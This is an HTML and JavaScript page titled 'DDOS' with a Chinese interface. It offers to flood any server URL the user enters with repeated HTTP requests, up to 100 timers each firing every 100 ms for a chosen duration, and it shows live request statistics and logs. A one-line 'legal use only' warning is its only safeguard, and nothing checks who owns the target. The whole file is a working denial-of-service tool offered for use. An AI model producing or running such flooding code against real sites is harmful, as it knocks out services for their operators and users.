<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDOS</title>
    <style>
        :root {
            --primary: #3498db;
            --danger: #e74c3c;
            --success: #2ecc71;
            --dark: #2c3e50;
            --light: #ecf0f1;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
            color: var(--light);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            padding: 30px 0;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        
        h1 {
            font-size: 2.8rem;
            margin-bottom: 10px;
            color: #fff;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
        }
        
        .subtitle {
            font-size: 1.2rem;
            color: #bbb;
            max-width: 800px;
            margin: 0 auto;
            line-height: 1.6;
        }
        
        .warning {
            background: rgba(231, 76, 60, 0.2);
            border: 2px solid var(--danger);
            border-radius: 8px;
            padding: 20px;
            margin: 25px auto;
            max-width: 800px;
            text-align: center;
            font-weight: bold;
        }
        
        .card {
            background: rgba(0, 0, 0, 0.7);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
        }
        
        .card-title {
            font-size: 1.8rem;
            margin-bottom: 20px;
            color: var(--primary);
            display: flex;
            align-items: center;
        }
        
        .card-title i {
            margin-right: 12px;
            font-size: 1.5rem;
        }
        
        .input-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 500;
            font-size: 1.1rem;
        }
        
        input, select {
            width: 100%;
            padding: 14px;
            border-radius: 8px;
            border: 2px solid #555;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        
        input:focus, select:focus {
            border-color: var(--primary);
            outline: none;
            background: rgba(255, 255, 255, 0.15);
        }
        
        .btn {
            display: inline-block;
            padding: 14px 28px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1.1rem;
            font-weight: 600;
            transition: all 0.3s ease;
            text-align: center;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn:hover {
            background: #2980b9;
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        .btn-danger {
            background: var(--danger);
        }
        
        .btn-danger:hover {
            background: #c0392b;
        }
        
        .btn-success {
            background: var(--success);
        }
        
        .btn-success:hover {
            background: #27ae60;
        }
        
        .btn-container {
            display: flex;
            gap: 20px;
            margin-top: 30px;
        }
        
        .btn-container .btn {
            flex: 1;
        }
        
        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-top: 30px;
        }
        
        .stat-card {
            background: rgba(52, 152, 219, 0.15);
            border-radius: 10px;
            padding: 25px;
            text-align: center;
            transition: transform 0.3s ease;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
        }
        
        .stat-value {
            font-size: 3rem;
            font-weight: 700;
            margin: 10px 0;
            color: var(--primary);
        }
        
        .stat-label {
            font-size: 1.1rem;
            color: #bbb;
        }
        
        .progress-container {
            margin-top: 30px;
        }
        
        .progress-bar {
            height: 25px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--success));
            border-radius: 12px;
            width: 0%;
            transition: width 0.5s ease;
        }
        
        .logs-container {
            background: rgba(0, 0, 0, 0.6);
            border-radius: 8px;
            padding: 20px;
            margin-top: 30px;
            height: 200px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
        }
        
        .log-entry {
            padding: 8px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .log-entry.success {
            color: var(--success);
        }
        
        .log-entry.error {
            color: var(--danger);
        }
        
        .log-entry.info {
            color: var(--primary);
        }
        
        footer {
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            color: #aaa;
            font-size: 0.9rem;
        }
        
        @media (max-width: 768px) {
            .btn-container {
                flex-direction: column;
            }
            
            .stats-container {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>DDOS</h1>
            <p class="subtitle">对指定服务器发动DDOS测试</p>
        </header>
        
        <div class="warning">
            ⚠️ 警告: 本工具仅用于合法用途!
        </div>
        
        <div class="card">
            <h2 class="card-title">参数配置</h2>
            
            <div class="input-group">
                <label for="targetUrl">目标服务器URL</label>
                <input type="url" id="targetUrl" placeholder="请输入服务器链接">
            </div>
            
            <div class="input-group">
                <label for="requestMethod">请求方法</label>
                <select id="requestMethod">
                    <option value="GET">GET</option>
                    <option value="POST">POST</option>
                    <option value="PUT">PUT</option>
                    <option value="DELETE">DELETE</option>
                </select>
            </div>
            
            <div class="input-group">
                <label for="concurrentRequests">并发请求数 (1-100)</label>
                <input type="number" id="concurrentRequests" min="1" max="100" value="20">
            </div>
            
            <div class="input-group">
                <label for="testDuration">持续时间 (秒)</label>
                <input type="number" id="testDuration" min="5" max="300" value="30">
            </div>
            
            <div class="btn-container">
                <button id="startTest" class="btn btn-success">开始</button>
                <button id="stopTest" class="btn btn-danger">停止</button>
                <button id="resetTest" class="btn">重置</button>
            </div>
        </div>
        
        <div class="card">
            <h2 class="card-title">统计</h2>
            
            <div class="stats-container">
                <div class="stat-card">
                    <div class="stat-label">总请求数</div>
                    <div id="totalRequests" class="stat-value">0</div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-label">成功请求</div>
                    <div id="successRequests" class="stat-value">0</div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-label">失败请求</div>
                    <div id="failedRequests" class="stat-value">0</div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-label">平均响应时间</div>
                    <div id="avgResponse" class="stat-value">0ms</div>
                </div>
            </div>
            
            <div class="progress-container">
                <div class="stat-label">进度</div>
                <div class="progress-bar">
                    <div id="testProgress" class="progress-fill"></div>
                </div>
            </div>
        </div>
        
        <div class="card">
            <h2 class="card-title">实时日志</h2>
            <div id="logs" class="logs-container">
                <div class="log-entry info">就绪等待测试指令...</div>
            </div>
        </div>
    <script>
        let testRunning = false;
        let testInterval;
        let testStartTime;
        let testDuration;
        let stats = {
            totalRequests: 0,
            successRequests: 0,
            failedRequests: 0,
            totalResponseTime: 0
        };
        
        const startBtn = document.getElementById('startTest');
        const stopBtn = document.getElementById('stopTest');
        const resetBtn = document.getElementById('resetTest');
        const logsContainer = document.getElementById('logs');
        const progressBar = document.getElementById('testProgress');
        
        document.addEventListener('DOMContentLoaded', () => {
            startBtn.addEventListener('click', startTest);
            stopBtn.addEventListener('click', stopTest);
            resetBtn.addEventListener('click', resetTest);
        });
        
        function addLog(message, type = 'info') {
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry ${type}`;
            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logsContainer.appendChild(logEntry);
            logsContainer.scrollTop = logsContainer.scrollHeight;
        }
        
        function updateStats() {
            document.getElementById('totalRequests').textContent = stats.totalRequests;
            document.getElementById('successRequests').textContent = stats.successRequests;
            document.getElementById('failedRequests').textContent = stats.failedRequests;
            
            const avgResponse = stats.totalRequests > 0 ? 
                Math.round(stats.totalResponseTime / stats.totalRequests) : 0;
            document.getElementById('avgResponse').textContent = `${avgResponse}ms`;
        }
        
        function sendRequest() {
            if (!testRunning) return;
            
            const targetUrl = document.getElementById('targetUrl').value;
            const method = document.getElementById('requestMethod').value;
            
            const startTime = Date.now();
            
            const xhr = new XMLHttpRequest();
            xhr.open(method, targetUrl);
            
            xhr.onload = function() {
                if (xhr.status >= 200 && xhr.status < 300) {
                    stats.successRequests++;
                    addLog(`请求成功: ${xhr.status} ${method} ${targetUrl}`, 'success');
                } else {
                    stats.failedRequests++;
                    addLog(`请求失败: ${xhr.status} ${method} ${targetUrl}`, 'error');
                }
                
                stats.totalRequests++;
                stats.totalResponseTime += (Date.now() - startTime);
                updateStats();
            };
            
            xhr.onerror = function() {
                stats.failedRequests++;
                stats.totalRequests++;
                addLog(`请求错误: ${method} ${targetUrl}`, 'error');
                updateStats();
            };
            
            try {
                xhr.send();
            } catch (error) {
                stats.failedRequests++;
                stats.totalRequests++;
                addLog(`请求异常: ${error.message}`, 'error');
                updateStats();
            }
        }
        
        function startTest() {
            if (testRunning) return;
            
            const targetUrl = document.getElementById('targetUrl').value;
            const concurrent = parseInt(document.getElementById('concurrentRequests').value);
            testDuration = parseInt(document.getElementById('testDuration').value) * 1000;
            
            if (!targetUrl) {
                addLog('错误: 请输入目标URL', 'error');
                return;
            }
            
            if (concurrent < 1 || concurrent > 100) {
                addLog('错误: 并发请求数必须在1-100之间', 'error');
                return;
            }
            
            testRunning = true;
            testStartTime = Date.now();
            stats = {
                totalRequests: 0,
                successRequests: 0,
                failedRequests: 0,
                totalResponseTime: 0
            };
            
            updateStats();
            progressBar.style.width = '0%';
            logsContainer.innerHTML = '';
            
            addLog(`启动: ${concurrent}个并发请求，持续${testDuration/1000}秒`, 'info');
            addLog(`目标: ${targetUrl}`, 'info');
            
            for (let i = 0; i < concurrent; i++) {
                setInterval(() => sendRequest(), 100);
            }
            
            const progressInterval = setInterval(() => {
                if (!testRunning) {
                    clearInterval(progressInterval);
                    return;
                }
                
                const elapsed = Date.now() - testStartTime;
                const progress = Math.min(100, (elapsed / testDuration) * 100);
                progressBar.style.width = `${progress}%`;
                
                if (elapsed >= testDuration) {
                    stopTest();
                    clearInterval(progressInterval);
                }
            }, 200);
            
            setTimeout(() => {
                if (testRunning) {
                    stopTest();
                }
            }, testDuration);
        }
        
        function stopTest() {
            if (!testRunning) return;
            
            testRunning = false;
            addLog('已停止', 'info');
            
            const elapsed = (Date.now() - testStartTime) / 1000;
            const qps = elapsed > 0 ? (stats.totalRequests / elapsed).toFixed(2) : 0;
            
            addLog(`摘要: 总请求 ${stats.totalRequests}, 成功 ${stats.successRequests}, 失败 ${stats.failedRequests}`);
            addLog(`QPS: ${qps}, 平均响应时间: ${stats.totalRequests > 0 ? Math.round(stats.totalResponseTime / stats.totalRequests) : 0}ms`);
        }
        
        function resetTest() {
            testRunning = false;
            stats = {
                totalRequests: 0,
                successRequests: 0,
                failedRequests: 0,
                totalResponseTime: 0
            };
            
            updateStats();
            progressBar.style.width = '0%';
            logsContainer.innerHTML = '<div class="log-entry info">就绪等待测试指令...</div>';
        }
    </script>
</body>
</html>
